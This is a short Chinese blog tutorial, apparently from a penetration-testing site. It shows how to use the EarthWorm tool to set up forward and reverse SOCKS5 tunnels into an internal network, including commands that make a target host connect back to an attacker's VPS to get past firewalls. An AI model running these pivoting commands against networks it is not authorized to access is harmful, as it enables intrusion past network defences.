---
title: "EarthWorm 内网穿透"
date: 2018-02-18T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['windows','linux']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


EW 是一套便携式的网络穿透工具, 具有 SOCKS v5服务架设和端口转发两大核心功能, 可在复杂网络环境下完成网络穿透.

<!--more-->

一般进入内网有 正向代理 和 反向代理 两种方法

正向代理需要目标主机有公网 IP 反向代理则适用于被防火墙拦截的情况

# 正向代理

## 目标主机

`ew -s ssocksd -l 1080`

在本地架设 socks 5 服务器 监听 1080 端口

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687438.jpg)

socks 客户端 Proxifier (windows) proxychains (linux)

连接成功后 显示信息

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687428.jpg)

ping 通了目标主机的另外一块网卡

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687478.jpg)

# 反向代理

## vps

`ew -s rcsocks -l 1080 -e 8888`

将来自 8888 端口的请求转发至 1080 端口

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687674.jpg)

## 目标主机

`ew -s rssocks -d ip -e 8888`

连接指定 ip 并将数据转发至 8888 端口

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687679.jpg)

成功后会提示 rssocks cmd_socket ok

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687738.jpg)

同样 ping 通网卡

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/15/1518687769.jpg)